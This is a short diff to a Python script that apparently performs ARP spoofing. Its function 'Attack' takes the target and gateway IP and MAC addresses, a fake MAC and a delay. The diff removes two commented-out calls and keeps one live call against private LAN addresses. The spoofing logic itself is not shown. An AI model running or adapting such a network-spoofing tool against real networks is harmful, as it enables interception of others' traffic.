@@ -29,6 +29,4 @@ def Attack(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak):
         time.sleep(timebreak)
 
 if __name__ == "__main__":
-    #Attack("192.168.1.23", "28-59-23-5d-5a-04", "192.168.1.1", "48-4c-29-62-fe-08","00-00-00-00-00-00",1)
-    #Attack("192.168.1.23", "28-59-23-5d-5a-04", "192.168.1.1", "48-4c-29-62-fe-08","EC-2E-98-E2-B9-35",1)
     Attack("192.168.120.18", "0a-7f-47-af-c0-53", "192.168.120.1", "e0-5d-54-ce-c1-66","EC-2E-98-E2-B9-35",1)
